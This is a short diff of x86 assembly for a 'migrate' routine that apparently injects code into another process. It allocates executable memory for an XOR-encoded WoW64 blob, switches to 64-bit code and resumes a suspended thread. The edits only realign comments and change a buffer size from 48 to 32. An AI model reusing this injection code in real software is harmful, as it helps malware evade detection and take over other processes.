@@ -21,9 +21,9 @@ migrate:
     ; ebp - 28 = execute64 code
     ; ebp - 32 = x64function code
     ; ebp - 36 = ptr to wow64 ctx
-    sub esp, 36                     ; allocate local variables space
+    sub esp, 36                         ; allocate local variables space
 
-    mov dword [ebp - 4], 0                ; return value
+    mov dword [ebp - 4], 0              ; return value
 
     call get_kernel_module_handle
 
@@ -159,7 +159,7 @@ migrate:
     or eax, MEM_COMMIT
     push eax
     mov eax, wownative_data_xor.len
-    add eax, 48                         ; wownative + wow64context
+    add eax, 32                         ; wownative + wow64context
     push eax
     push dword 0
     call [virtual_alloc]
@@ -188,7 +188,7 @@ migrate:
     push eax
     push PAGE_EXECUTE_READWRITE
     mov eax, wownative_data_xor.len
-    add eax, 48                         ; wownative + wow64context
+    add eax, 32                         ; wownative + wow64context(32 bytes)
     push eax
     push dword [ebp - 32]               ; x64function mem
     call [virtual_protect]
@@ -222,8 +222,9 @@ migrate:
     cmp dword [eax], 0                  ; is hThread == 0 ?
     je .shutdown
 
+    ; resume the thread, since it is created in suspended mode
     push dword [eax]
-    call [resume_thread]                ; the thread is created in suspended mode
+    call [resume_thread]
 
 .shutdown:
     mov eax, 0                          ; return value
